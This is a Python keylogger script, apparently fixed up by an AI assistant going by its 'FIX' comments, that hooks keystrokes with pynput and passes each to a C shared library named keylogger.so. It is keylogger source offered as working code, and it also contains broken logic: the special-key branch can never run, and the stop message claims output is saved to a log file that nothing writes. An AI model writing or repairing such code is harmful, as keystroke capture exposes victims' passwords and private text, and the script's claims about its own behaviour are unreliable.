import os # <-- FIX: Added missing import for os module
import pynput
from pynput import keyboard
from ctypes import cdll, c_char_p, c_int

# Define the file name where logs will be saved
LOG_FILE = "/tmp/keylog.txt"

# --- Setup ---
# Load the C-based keylogger library
# Using os.environ['HOME'] is fine, but os.path.expanduser("~") is often preferred.
# I'll keep your original path construction style for consistency.
lib_path = os.path.join(os.environ['HOME'], "Documents", "VRS", "keylogger.so")
keylogger_lib = cdll.LoadLibrary(lib_path)

# Define argument types for the C function for safer interaction
# Assuming C function signature: int write(int fd, const char *buf, size_t count);
keylogger_lib.write.argtypes = [c_int, c_char_p, c_int]


# Helper function to log keystrokes to a file
# This function is currently unused in your provided code but is left for completeness.
def log_key(key_data):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(key_data)
        
    except Exception as e:
        print(f"\n[ERROR: Could not write to file {LOG_FILE}: {e}]")

# Handler for key presses
def on_press(key):
    try:
        key_data = ""
        
        # 1. Safely convert the pynput Key object to a readable string
        if key == keyboard.Key.esc:
            return False  # Stop the listener
        
        try:
            # Try to get the character for character keys (a, b, 1, 2, etc.)
            key_data = str(key)
        except AttributeError:
            # Handle special keys (Key.space, Key.shift, Key.ctrl, etc.)
            # Convert the Key object to its string name for logging
            if key == keyboard.Key.space:
                key_data = "space"
            elif key == keyboard.Key.esc:
                key_data = "Esc"
        
        # 2. Encode the Python string to a C-style char pointer (bytes)
        c_char_data = key_data.encode('utf-8')
        
        # 3. Call the C-based keylogger function
        # Using 1 for stdout as per your comment '// stdout'
        # Note: You were using cdll.c_char_p() as an argument wrapper before, 
        # but passing the bytes object directly is safer when argtypes is set.
        keylogger_lib.write(1, c_char_data, len(c_char_data)) 

    except Exception as e:
        print(f"\n[ERROR: Could not process keystroke: {e}]")


# Handler for key releases
def on_release(key):
    if key == keyboard.Key.esc:
        print(f"\n[Key listener stopped. Output saved to {LOG_FILE}]")
        return False


# Main function to start logging
def log_keystrokes():
    # <-- FIX: Added the missing closing parenthesis ')' here
    print(f"Starting key listener... Logging to {LOG_FILE}. Press 'Esc' to stop.")
    
    # Set up the listener with the C-based keylogger library
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run the key logger
if __name__ == "__main__":
    log_keystrokes()
